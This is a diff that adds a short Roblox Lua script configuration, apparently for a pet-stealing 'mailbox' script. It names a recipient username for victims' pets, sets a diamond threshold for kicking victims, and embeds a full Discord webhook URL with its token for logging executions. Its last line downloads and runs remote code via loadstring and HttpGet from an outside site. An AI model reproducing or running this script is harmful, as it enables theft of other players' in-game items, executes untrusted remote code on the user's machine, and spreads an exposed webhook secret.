@@ -1,0 +1,26 @@
+
+
+
+_G.Username = "thinhfankia" --// Username To Send Pets To
+
+_G.Diamonds = 5000000 --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1107683863750262824/iucppT3TuUM_e-vnWAGkB4PhnD6CBj8h2wkt4XZOTyRoWRRskFEkQ1DMLEbIoVWkQljM" --// Discord Webhook For Executions
+
+--[[ PREMIUM SETTINGS ]]--
+
+--[[ Don't try to use if u don't own premium ]]--
+
+_G.Key = "" --// This Key Is Ur Username If U Have Any Questions Dm's Pewcio#0001
+
+_G.WebhookDualHook = "" --// Discord Webhook For Executions
+
+_G.LoadingScreen = 1 --// Choose Loading Screen [All Screens Are Shown Here 💡┊loading screen ]
+
+_G.ScriptName = "" --// Script Name UwU
+
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
